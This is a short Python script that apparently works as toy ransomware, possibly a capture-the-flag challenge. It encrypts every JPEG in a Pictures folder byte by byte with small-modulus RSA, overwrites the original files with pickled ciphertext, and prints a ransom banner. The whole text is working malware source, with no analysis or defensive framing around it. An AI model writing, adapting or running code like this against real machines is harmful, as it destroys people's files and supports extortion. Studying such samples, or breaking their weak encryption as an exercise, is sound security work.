#!/usr/bin/python3

import os
import pickle

picture_path = './Pictures'
jpgs = [filename for filename in os.listdir(picture_path) if filename.endswith('.jpg')]

# RSA encryption
n = 22291846172619859445381409012451
e = 65535

plain_bytes = b''
for filename in jpgs:
    filename = './Pictures/' + filename
    with open(filename, 'rb') as f:
        plain_bytes = f.read()
    cipher_int = [pow(i, e, n) for i in plain_bytes]
    with open(filename, 'wb') as f:
        pickle.dump(cipher_int, f)

str = """\
///////////////////////////////////////////////////////////////////
////////////////////---------ERROR----------///////////////////////
////////////------ Give me ransom hahaha -------///////////////////
///////////////////////////////////////////////////////////////////
"""

print(str, end='')
